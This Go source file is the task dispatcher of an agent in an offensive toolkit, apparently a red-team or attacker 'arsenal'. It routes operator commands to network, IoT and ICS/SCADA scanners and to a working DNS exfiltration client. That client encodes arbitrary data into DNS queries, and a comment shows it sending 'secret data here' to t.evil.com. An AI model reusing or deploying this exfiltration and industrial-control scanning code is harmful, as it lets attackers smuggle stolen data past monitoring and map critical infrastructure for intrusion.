// Package agentfw is the agent-side framework dispatcher. Given a Task with
// Kind="framework", it routes to a Go-native implementation of that module.
// Modules not yet ported to Go return an explicit error, so the operator sees
// the gap instead of a silent failure.
package agentfw

import (
	"context"
	"net"
	"os"
	"strings"
	"fmt"
	"strconv"
	"time"

	"github.com/sk666G/red-sky---arsenal/internal/icsdiscover"
	"github.com/sk666G/red-sky---arsenal/internal/dnsexfil"
	"github.com/sk666G/red-sky---arsenal/internal/iotdiscover"
	"github.com/sk666G/red-sky---arsenal/internal/scanner"
)

// Result is what a framework task returns.
type Result struct {
	Output   string
	Err      error
	ExitCode int
}

// Dispatch runs a framework task by name.
func Dispatch(ctx context.Context, module string, args []string) Result {
	switch module {
	case "net_scanner":
		return runNetScanner(ctx, args)
	case "iot":
		return runIoTDiscover(ctx, args)
	case "ics_scada":
		return runICSDiscover(ctx, args)
	case "dns_exfil":
		return runDNSExfil(ctx, args)
	default:
		return Result{
			Err:      fmt.Errorf("framework module not implemented on agent: %s", module),
			ExitCode: 127,
		}
	}
}

func runNetScanner(ctx context.Context, args []string) Result {
	// Expected: args = [cidr, ports, threads]
	if len(args) < 2 {
		return Result{Err: fmt.Errorf("net_scanner needs <cidr> <ports> [threads]"), ExitCode: 2}
	}
	cidr := args[0]
	portSpec := args[1]
	threads := 1000
	if len(args) >= 3 {
		if n, err := strconv.Atoi(args[2]); err == nil && n > 0 {
			threads = n
		}
	}

	hosts, err := scanner.ParseCIDR(cidr)
	if err != nil {
		return Result{Err: err, ExitCode: 2}
	}
	ports, err := scanner.ParsePorts(portSpec)
	if err != nil {
		return Result{Err: err, ExitCode: 2}
	}

	// Discovery stage.
	live := scanner.DiscoverAlive(ctx, hosts, nil, 500, 800*time.Millisecond, func(string) {})
	if len(live) == 0 {
		return Result{Output: fmt.Sprintf("net_scanner %s: no live hosts\n", cidr)}
	}

	// Full scan of live hosts.
	var lines []string
	lines = append(lines, fmt.Sprintf("net_scanner %s -> %d live host(s)", cidr, len(live)))
	err = scanner.Scan(ctx, scanner.ScanOptions{
		Hosts:   live,
		Ports:   ports,
		Threads: threads,
		Timeout: 2 * time.Second,
	}, func(r scanner.Result) {
		lines = append(lines, fmt.Sprintf("%s:%d open", r.Host, r.Port))
	})
	if err != nil {
		return Result{Err: err, ExitCode: 1}
	}
	out := ""
	for _, l := range lines {
		out += l + "\n"
	}
	if len(lines) == 1 {
		out += "(no open ports)\n"
	}
	return Result{Output: out}
}


func runIoTDiscover(ctx context.Context, args []string) Result {
	// args is either empty (multicast only) or ["scan" "cidr"]
	var hosts []string
	if len(args) >= 2 && args[0] == "scan" {
		// derive hosts from the cidr
		if h, err := scanner.ParseCIDR(args[1]); err == nil {
			hosts = h
		}
	}
	devices := iotdiscover.Scan(ctx, iotdiscover.Options{
		Hosts:   hosts,
		Timeout: 3 * time.Second,
	})
	var b strings.Builder
	fmt.Fprintf(&b, "iot discover -> %d device(s)\n", len(devices))
	for _, d := range devices {
		fmt.Fprintf(&b, "  %s", d.IP)
		if d.Vendor != "" {
			fmt.Fprintf(&b, "  vendor=%s", d.Vendor)
		}
		if d.MAC != "" {
			fmt.Fprintf(&b, "  mac=%s", d.MAC)
		}
		if len(d.Signals) > 0 {
			fmt.Fprintf(&b, "  signals=%s", strings.Join(d.Signals, ","))
		}
		b.WriteString("\n")
	}
	return Result{Output: b.String(), ExitCode: 0}
}


func runICSDiscover(ctx context.Context, args []string) Result {
	// args: ["scan", "cidr"] or empty
	var hosts []string
	if len(args) >= 2 && args[0] == "scan" {
		if h, err := scanner.ParseCIDR(args[1]); err == nil {
			hosts = h
		}
	}
	if len(hosts) == 0 {
		return Result{Err: fmt.Errorf("ics_scada needs a cidr: ics_scada scan 10.0.0.0/24"), ExitCode: 2}
	}
	devices := icsdiscover.Scan(ctx, icsdiscover.Options{
		Hosts:   hosts,
		Timeout: 2 * time.Second,
	})
	var b strings.Builder
	fmt.Fprintf(&b, "ics_scada scan %s -> %d device(s)\n", args[1], len(devices))
	for _, d := range devices {
		fmt.Fprintf(&b, "  %s  protocols=%s\n", d.IP, strings.Join(d.Protocols, ","))
		for _, det := range d.Details {
			fmt.Fprintf(&b, "      %s\n", det)
		}
	}
	if len(devices) == 0 {
		b.WriteString("  (no ICS devices found)\n")
	}
	return Result{Output: b.String(), ExitCode: 0}
}


// runDNSExfil implements the agent-side DNS exfiltration client.
// args: ["<domain>", "<resolver-or-empty>", "<payload>"]
// Example: dns_exfil t.evil.com 8.8.8.8 "secret data here"
func runDNSExfil(ctx context.Context, args []string) Result {
	if len(args) < 3 {
		return Result{Err: fmt.Errorf("dns_exfil needs <domain> <resolver|-> <payload>"), ExitCode: 2}
	}
	domain := args[0]
	resolver := args[1]
	if resolver == "-" {
		resolver = ""
	}
	payload := strings.Join(args[2:], " ")

	sessionID := fmt.Sprintf("s%d", time.Now().UnixNano()&0xFFFFFF)
	labels := dnsexfil.Encode([]byte(payload), sessionID, domain)

	// Resolve the resolver: when empty, read /etc/resolv.conf's first entry.
	if resolver == "" {
		resolver = systemResolver()
	}
	if resolver == "" {
		return Result{Err: fmt.Errorf("no resolver"), ExitCode: 2}
	}

	var sent int
	for _, label := range labels {
		if err := sendDNSQuery(label, resolver); err == nil {
			sent++
		}
		time.Sleep(50 * time.Millisecond)
	}
	return Result{
		Output:   fmt.Sprintf("dns_exfil session=%s sent %d/%d labels to %s\n", sessionID, sent, len(labels), resolver),
		ExitCode: 0,
	}
}

func systemResolver() string {
	data, err := os.ReadFile("/etc/resolv.conf")
	if err != nil {
		return ""
	}
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "nameserver") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				return fields[1]
			}
		}
	}
	return ""
}

func sendDNSQuery(qname, resolver string) error {
	// Build a minimal DNS A record query.
	txid := uint16(time.Now().UnixNano() & 0xFFFF)
	pkt := make([]byte, 12)
	pkt[0] = byte(txid >> 8)
	pkt[1] = byte(txid)
	pkt[2] = 0x01 // recursion desired
	pkt[5] = 0x01 // qdcount

	for _, part := range strings.Split(qname, ".") {
		if len(part) == 0 {
			continue
		}
		if len(part) > 63 {
			part = part[:63]
		}
		pkt = append(pkt, byte(len(part)))
		pkt = append(pkt, part...)
	}
	pkt = append(pkt, 0)
	pkt = append(pkt, 0, 1, 0, 1) // qtype A, qclass IN

	addr, err := net.ResolveUDPAddr("udp", resolver+":53")
	if err != nil {
		return err
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return err
	}
	defer conn.Close()
	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	_, err = conn.Write(pkt)
	return err
}
